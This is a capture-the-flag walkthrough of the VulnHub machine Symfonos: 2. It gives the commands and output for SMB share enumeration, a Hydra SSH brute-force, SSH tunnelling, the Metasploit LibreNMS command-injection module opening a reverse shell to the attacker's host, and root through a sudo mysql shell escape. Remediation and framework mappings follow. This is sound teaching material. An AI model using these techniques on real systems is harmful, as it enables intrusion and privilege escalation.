# Symfonos: 2 — A Symphony of Misconfigurations

Look at guys!! Symfonos 2 is a beautiful intermediate machine that chains together five distinct misconfigurations into one clean attack path. No CVEs, no exploits in the traditional sense: just misconfigured SMB shares leaking usernames, weak SSH passwords, an internal service hidden behind a port forward, and a sudo rule that lets anyone with MySQL access become root. The LibreNMS command injection module ties it all together. fr fr, this is exactly how real internal network compromises look. Big respect to zayotic for this one.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | Symfonos: 2 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/symfonos-2,331/ |
| **Techniques** | SMB anonymous enumeration, SSH brute-force (Hydra), internal service discovery via netstat, SSH local port forwarding, LibreNMS command injection (Metasploit), sudo mysql GTFOBin shell escape |
| **CVEs** | CVE-2019-10669 (LibreNMS command injection via addhost), CWE-522 (Insufficiently Protected Credentials: weak SSH password), CWE-269 (Improper Privilege Management: sudo mysql NOPASSWD) |
| **APT Groups** | APT28 (Fancy Bear): uses SMB share enumeration as a primary reconnaissance technique in enterprise environments; Lazarus Group: exploits misconfigured internal web services after initial SSH access for lateral movement |

---

## Attack Summary

```
netdiscover → 192.168.1.102
    |
    v
nmap → FTP 21, SSH 22, HTTP 80, SMB 139/445
    |
    v
smbclient -L → anonymous share → /backups/log.txt → username: aeolus
    |
    v
hydra -l aeolus -P rockyou.txt → aeolus:sergioteamo
    |
    v
ssh aeolus@target → netstat → 127.0.0.1:8080 (LibreNMS)
    |
    v
ssh -L 1234:127.0.0.1:8080 aeolus@target (port forward)
    |
    v
MSF: exploit/linux/http/libre_addhost_cmd_inject → shell as librenms
    |
    v
sudo -l → (ALL) NOPASSWD: /usr/bin/mysql
    |
    v
sudo mysql -e '\! /bin/sh' → uid=0(root)
    |
    v
cat /root/proof.txt → GG
```

---

## Methodology

1. Host discovery and full port scan
2. SMB anonymous share enumeration for credentials and hints
3. SSH brute-force using discovered username
4. Internal service discovery after gaining SSH access
5. SSH local port forwarding to expose internal LibreNMS
6. LibreNMS command injection via Metasploit
7. Privilege escalation via sudo mysql shell escape
8. Root flag capture

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -A -p- 192.168.1.102
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian
80/tcp  open  http        WebFS httpd 1.21
139/tcp open  netbios-ssn Samba smbd 3.X-4.X
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

Five services open. FTP on port 21 (ProFTPD), SSH, HTTP, and SMB on two ports. SMB anonymous access is always worth checking on a boot2root machine.

**Alternatives:** `masscan -p21,22,80,139,445 --rate=1000 192.168.1.102` for faster targeted scans.

**MITRE ATT&CK:** T1046 — Network Service Discovery; T1135 — Network Share Discovery

---

## Step 2 — SMB Anonymous Share Enumeration

```bash
smbclient -L 192.168.1.102 -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
anonymous       Disk
IPC$            IPC       IPC Service
```

The `anonymous` share is accessible without credentials:

```bash
smbclient //192.168.1.102/anonymous -N
```

```
smb: \> ls
  .                                   D        0
  ..                                  D        0
  backups                             D        0

smb: \> cd backups
smb: \backups\> ls
  .                                   D        0
  ..                                  D        0
  log.txt                             N      384

smb: \backups\> get log.txt
```

Reading `log.txt`:

```
Jun 19 04:35:21 symfonos2 root: cmd run for aeolus
...
/home/aeolus/
```

The backup log reveals the username **aeolus**. This is a classic information disclosure: backup files stored in unauthenticated network shares often contain usernames, paths, and configuration data.

**Real-world note:** APT28 (Fancy Bear) systematically enumerates SMB shares during internal network reconnaissance. Anonymous SMB shares containing backup files or configuration logs have been exploited in documented intrusions against government and defense organizations. The fix: disable anonymous SMB access entirely.

**MITRE ATT&CK:** T1135 — Network Share Discovery; T1552.001 — Credentials in Files

---

## Step 3 — SSH Brute-Force with Hydra

With username `aeolus` in hand, brute-force SSH:

```bash
hydra -l aeolus -P /usr/share/wordlists/rockyou.txt 192.168.1.102 ssh -t 4
```

```
[22][ssh] host: 192.168.1.102   login: aeolus   password: sergioteamo
```

**Credentials found: `aeolus:sergioteamo`**

Login:

```bash
ssh aeolus@192.168.1.102
```

**Real-world note:** Weak SSH passwords are the #1 initial access vector in Linux environments. CISA's AA22-074A and multiple Verizon DBIR reports confirm that credential brute-force accounts for a significant percentage of confirmed breaches. The fix: enforce key-based authentication, disable password auth, implement fail2ban or similar.

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing; T1021.004 — Remote Services: SSH

---

## Step 4 — Internal Service Discovery

After logging in as `aeolus`, discover internal services:

```bash
netstat -tlnp 2>/dev/null
# or
ss -tlnp
```

```
tcp  0  0 127.0.0.1:8080  0.0.0.0:*  LISTEN  -
tcp  0  0 0.0.0.0:22      0.0.0.0:*  LISTEN  -
tcp  0  0 0.0.0.0:80      0.0.0.0:*  LISTEN  -
```

Port **8080** is bound to `127.0.0.1` only, invisible from the network. Something interesting is running internally. Check what it is:

```bash
curl -s http://127.0.0.1:8080/ | head -20
# LibreNMS application
```

LibreNMS is a network monitoring platform with a known command injection vulnerability.

**MITRE ATT&CK:** T1049 — System Network Connections Discovery; T1016 — System Network Configuration Discovery

---

## Step 5 — SSH Local Port Forwarding

Expose LibreNMS on port 8080 to the attacker machine via SSH tunneling:

```bash
ssh -L 1234:127.0.0.1:8080 aeolus@192.168.1.102
```

Now browse `http://127.0.0.1:1234/` from the attacker machine to reach the internal LibreNMS instance.

Login with `aeolus:sergioteamo`. LibreNMS version is visible in the footer or headers.

**Alternatives:** Chisel for non-SSH tunneling, or Metasploit's `route` command with a Meterpreter session.

**MITRE ATT&CK:** T1572 — Protocol Tunneling; T1090 — Proxy

---

## Step 6 — LibreNMS Command Injection (CVE-2019-10669)

LibreNMS has a command injection vulnerability in the "Add Device" functionality. Use Metasploit:

```bash
msfconsole -q
use exploit/linux/http/libre_addhost_cmd_inject
set RHOSTS 127.0.0.1
set RPORT 1234
set LHOST 192.168.1.103
set USERNAME aeolus
set PASSWORD sergioteamo
exploit
```

```
[*] Started reverse TCP handler on 192.168.1.103:4444
[*] Exploit running as background job
[*] Sending stage (985320 bytes) to 192.168.1.102
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: librenms
```

The exploit delivers a Meterpreter session running as the `librenms` service user.

**Real-world note:** CVE-2019-10669 affects LibreNMS versions before 1.53.1. This class of vulnerability (command injection in network monitoring tools) is particularly dangerous because these tools often have elevated privileges to manage network devices. Always patch network monitoring platforms and run them under dedicated service accounts.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Privilege Escalation via sudo mysql

Drop to a shell and check sudo rights:

```bash
meterpreter > shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
$ sudo -l
```

```
User librenms may run the following commands on symfonos2:
    (ALL) NOPASSWD: /usr/bin/mysql
```

MySQL is in the sudo list with no password required. MySQL supports a `\! command` shell escape from its interactive prompt. Use the GTFOBins technique:

```bash
sudo mysql -e '\! /bin/sh'
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root via GTFOBins. Classic.

**Real-world note:** Any command in the sudoers list that supports shell escapes (`mysql`, `vim`, `less`, `find`, `python`, `perl`, etc.) becomes a trivial privilege escalation path. GTFOBins documents every known technique. In real engagements, `sudo -l` is one of the first three commands run after gaining a shell. Fix: remove `mysql` from sudo; use dedicated database credentials; never grant NOPASSWD for interactive tools.

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control Mechanism: Sudo; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Username | aeolus | SMB share /backups/log.txt | SSH brute-force target |
| Credential | aeolus:sergioteamo | Hydra SSH brute-force | SSH login + LibreNMS auth |
| LibreNMS session | librenms user | CVE-2019-10669 Metasploit | Shell on target |
| Root proof | (varies) | /root/proof.txt | Challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Backup logs in SMB anonymous share reveal username | Backup exposure is an OWASP A05 Security Misconfiguration finding; APT28 exploits this routinely | Remove sensitive files from unauthenticated shares; audit all accessible SMB paths |
| 2 | Weak SSH password crackable with rockyou | Credential brute-force is the #1 initial access technique per Verizon DBIR | Enforce strong passwords; SSH key-only auth; implement fail2ban |
| 3 | Internal service on localhost accessible via SSH tunnel | SSH port forwarding can expose internal services to external attackers | Set `AllowTcpForwarding no` in sshd_config unless specifically required |
| 4 | LibreNMS command injection CVE-2019-10669 | Network monitoring tools run with elevated privileges; RCE is critical impact | Patch network management tools immediately; run as dedicated low-privilege user |
| 5 | sudo mysql NOPASSWD enables GTFOBins root | Any interactive tool in sudo list is a privilege escalation vector | Audit sudoers; never grant NOPASSWD for interactive tools; use specific non-interactive commands only |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | Network Share Discovery | T1135 |
| Credential Access | Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | System Network Connections Discovery | T1049 |
| Lateral Movement | Lateral Movement | Protocol Tunneling | T1572 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove sensitive files from SMB shares:** audit all anonymous-accessible shares; remove backup logs and configuration files
2. **Enforce SSH key-based authentication:** set `PasswordAuthentication no` in sshd_config
3. **Disable SSH port forwarding:** set `AllowTcpForwarding no` unless explicitly required
4. **Patch LibreNMS:** update to version 1.53.1 or later; disable the addhost feature if unused
5. **Remove mysql from sudoers:** audit all sudo rules; grant only non-interactive, specific commands
6. **Implement SMB signing:** prevent NTLM relay against SMB shares

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all SMB shares and accessible files |
| Protect | Access Control | Disable anonymous SMB; enforce SSH key auth; restrict sudo |
| Protect | Data Security | No backup logs or credentials in network-accessible shares |
| Detect | Anomalies and Events | Alert on SSH brute-force attempts; anonymous SMB access |
| Respond | Response Planning | Rotate aeolus credentials; patch LibreNMS; audit sudo rules |
| Recover | Recovery Planning | Rebuild compromised host; audit all data in SMB shares |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | No anonymous SMB access; restrict internal services |
| AC-6 | Least Privilege | Remove mysql from sudoers; run LibreNMS as dedicated user |
| IA-2(1) | Multi-Factor Authentication | Require MFA for all SSH access where possible |
| IA-5 | Authenticator Management | Enforce strong passwords; SSH keys preferred |
| CM-7 | Least Functionality | Disable AllowTcpForwarding; disable anonymous SMB |
| SI-2 | Flaw Remediation | Patch LibreNMS (CVE-2019-10669) immediately |

### CISA KEV

CVE-2019-10669 (LibreNMS command injection) is a known exploited vulnerability. CISA recommends immediate patching per their Known Exploited Vulnerabilities catalog guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (disable anonymous SMB; patch LibreNMS)
- **D3-OAM** — Operating System Administrative Management (restrict sudo; enforce SSH keys)
- **D3-NTF** — Network Traffic Filtering (AllowTcpForwarding no; firewall internal services)
- **D3-UAP** — User Account Permissions (audit all sudoers entries)

---

## Final Thoughts

Symfonos 2 is a masterclass in chained misconfigurations. Each step naturally flows into the next: the SMB exposure gives you the username, the weak password gives you SSH, SSH gives you the tunnel, the tunnel gives you LibreNMS, LibreNMS gives you a shell, and sudo mysql gives you root. No single step is exotic; every technique is documented and well-understood. That is exactly the point: real compromises look like this. No magic, just patience and methodology. gg.

Thanks guys!! (❍ᴥ❍ʋ)
